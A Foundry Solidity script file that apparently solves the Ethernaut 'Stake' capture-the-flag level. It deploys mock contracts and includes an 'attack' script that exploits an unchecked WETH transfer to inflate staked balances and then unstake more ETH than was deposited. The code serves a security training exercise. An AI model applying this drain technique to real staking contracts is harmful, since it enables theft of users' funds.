pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Stake} from "../src/Stake.sol";
import {ERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

//To complete this level, the contract state must meet the following conditions:
//
//    The Stake contract's ETH balance has to be greater than 0.
//    totalStaked must be greater than the Stake contract's ETH balance.
//    You must be a staker.
//    Your staked balance must be 0.

contract Weth is ERC20
{
    constructor() ERC20("Wrapped Ether", "WETH") {}
}

// for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        Weth weth = new Weth();
        Stake stake = new Stake(address(weth));
        console.log("stake address:", address(stake));

        vm.stopBroadcast();
    }
}

// use a priv key different from the main one for the game
contract AnotherWalletStakes is Script
{
    function run() external
    {
        vm.startBroadcast();

        address stakeAddr; // instance address
        address wethAddr;  // call the instance to see weth address

        // i mean ... it increases you balance regardless of "success"
        Weth(wethAddr).approve(stakeAddr, 0.002 ether);
        Stake(stakeAddr).StakeWETH(0.002 ether);

        vm.stopBroadcast();
    }
}

contract attack is Script
{
    function run() external
    {
        vm.startBroadcast();

        address stakeAddr; // instance address
        address wethAddr;  // call the instance to see weth address
        Stake stake = Stake(stakeAddr);

        Weth(wethAddr).approve(stakeAddr, 0.002 ether);
        stake.StakeWETH(0.002 ether);

        stake.StakeETH{value: 0.001001 ether}();
        stake.Unstake(0.003001 ether); // my total stake eth + weth

        vm.stopBroadcast();
    }
}

